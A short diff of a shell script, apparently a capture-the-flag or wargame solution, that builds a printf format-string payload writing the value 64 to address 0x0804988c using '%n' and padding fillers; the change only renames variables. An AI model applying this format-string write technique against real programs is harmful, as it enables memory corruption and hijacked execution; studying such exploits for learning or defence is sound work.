@@ -18,9 +18,9 @@ ADDRESS="0804988c"
 VALUE="64"
 
 # We print the address '0x0804988c' and some fillers to reach 64 bytes
-PRINTF_ADDRESS=$(hex_little_endian ${PAYLOAD_ADDRESS})
+PRINTF_ADDRESS=$(hex_little_endian ${ADDRESS})
 PRINTF_ADDRESS_SIZE=$(echo -n "${PRINTF_ADDRESS}" | wc -c)
-PRINTF_VALUE_FILLER="%$(compute "${PAYLOAD_VALUE} - ${PRINTF_ADDRESS_SIZE}")c"
+PRINTF_VALUE_FILLER="%$(compute "${VALUE} - ${PRINTF_ADDRESS_SIZE}")c"
 
 # We print the printf write instruction using '%n'
 # The address '0x0804988c' is written at the start of the buffer
